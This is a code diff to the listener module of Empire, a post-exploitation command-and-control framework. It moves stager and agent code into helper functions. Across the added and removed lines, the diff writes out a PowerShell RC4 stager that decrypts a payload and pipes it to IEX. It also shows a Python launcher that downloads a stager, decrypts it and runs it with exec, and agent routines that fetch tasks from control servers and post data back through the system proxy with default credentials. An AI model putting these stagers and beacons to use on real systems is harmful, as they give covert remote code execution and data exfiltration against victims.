@@ -7,7 +7,7 @@ from builtins import object, str
 from typing import List, Optional, Tuple
 
 from empire.server.common import helpers, packets
-from empire.server.utils import data_util
+from empire.server.utils import data_util, listener_util
 from empire.server.utils.module_util import handle_validate_message
 
 LOG_NAME_PREFIX = __name__
@@ -196,7 +196,7 @@ class Listener(object):
                 )
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
+                stager += listener_util.powershell_rc4()
 
                 # prebuild the request routing packet for the launcher
                 routingPacket = packets.build_routing_packet(
@@ -217,6 +217,10 @@ class Listener(object):
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+                # Remove comments and make one line
+                stager = helpers.strip_powershell_comments(stager)
+                stager = data_util.ps_convert_to_oneliner(stager)
 
                 if obfuscate:
                     stager = data_util.obfuscate(
@@ -320,25 +324,10 @@ class Listener(object):
 
                 # install proxy and creds globally, so they can be used with urlopen.
                 launcherBase += "urllib2.install_opener(o);\n"
+                launcherBase += "a=o.open(server+t).read();\n"
 
                 # download the stager and extract the IV
-                launcherBase += "a=o.open(server+t).read();"
-                launcherBase += "IV=a[0:4];"
-                launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (stagingKey)
-
-                # RC4 decryption
-                launcherBase += "S,j,out=range(256),0,[]\n"
-                launcherBase += "for i in range(256):\n"
-                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "i=j=0\n"
-                launcherBase += "for char in data:\n"
-                launcherBase += "    i=(i+1)%256\n"
-                launcherBase += "    j=(j+S[i])%256\n"
-                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
-                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
-                launcherBase += "exec(''.join(out))"
+                launcherBase += listener_util.python_extract_stager(stagingKey)
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase).decode("UTF-8")
@@ -398,8 +387,7 @@ class Listener(object):
                     listenerOptions["Host"]["Value"]
                 )
 
-                getTask = (
-                    """
+                getTask = """
                     $script:GetTask = {
 
                         try {
@@ -410,32 +398,18 @@ class Listener(object):
                                 $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)
 
                                 # build the web request object
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
+                                $wc = New-Object System.Net.WebClient
 
                                 # set the proxy settings for the WC to be the default system settings
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("User-Agent",$script:UserAgent)
-                                $script:Headers.GetEnumerator() | % {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add("Cookie", "session=$RoutingCookie")
+                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $wc.Headers.Add("User-Agent",$script:UserAgent)
+                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
+                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
                                 $taskURI = $script:TaskURIs | Get-Random
-                                $result = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
+                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                 $result
                             }
                         }
@@ -448,10 +422,8 @@ class Listener(object):
                         }
                     }
                 """
-                )
 
-                sendMessage = (
-                    """
+                sendMessage = """
                     $script:SendMessage = {
                         param($Packets)
 
@@ -465,29 +437,17 @@ class Listener(object):
 
                             if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                 # build the web request object
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """ = New-Object System.Net.WebClient
+                                $wc = New-Object System.Net.WebClient
                                 # set the proxy settings for the WC to be the default system settings
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-                                $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add('User-Agent', $Script:UserAgent)
-                                $Script:Headers.GetEnumerator() | ForEach-Object {$"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.Headers.Add($_.Name, $_.Value)}
+                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
+                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
                                 try{
                                     # get a random posting URI
                                     $taskURI = $Script:TaskURIs | Get-Random
-                                    $response = $"""
-                    + helpers.generate_random_script_var_name("wc")
-                    + """.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
+                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                 }
                                 catch [System.Net.WebException]{
                                     # exception posting data...
@@ -500,7 +460,6 @@ class Listener(object):
                         }
                     }
                 """
-                )
 
                 return updateServers + getTask + sendMessage
 
@@ -516,51 +475,7 @@ class Listener(object):
                 socks_import = f.read()
                 f.close()
 
-                sendMessage = f"""
-def send_message(packets=None):
-    # Requests a tasking or posts data to a randomized tasking URI.
-    # If packets == None, the agent GETs a tasking from the control server.
-    # If packets != None, the agent encrypts the passed packets and
-    #    POSTs the data to the control server.
-    global missedCheckins
-    global server
-    global headers
-    global taskURIs
-    data = None
-    if packets:
-        # aes_encrypt_then_hmac is in stager.py
-        encData = aes_encrypt_then_hmac(key, packets)
-        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
-
-    else:
-        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
-        #   meta TASKING_REQUEST = 4
-        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
-        b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
-        headers['Cookie'] = "{self.session_cookie}session=%s" % (b64routingPacket)
-    taskURI = random.sample(taskURIs, 1)[0]
-    requestUri = server + taskURI
-
-    try:
-        wrapmodule(urllib.request)
-        data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, headers))).read()
-        return ('200', data)
-
-    except urllib.request.HTTPError as HTTPError:
-        # if the server is reached, but returns an error (like 404)
-        missedCheckins = missedCheckins + 1
-        #if signaled for restaging, exit.
-        if HTTPError.code == 401:
-            sys.exit(0)
-
-        return (HTTPError.code, '')
-
-    except urllib.request.URLError as URLerror:
-        # if the server cannot be reached
-        missedCheckins = missedCheckins + 1
-        return (URLerror.reason, '')
-    return ('', '')
-"""
+                sendMessage = listener_util.python_send_message(self.session_cookie)
                 return socks_import + updateServers + sendMessage
 
             else:
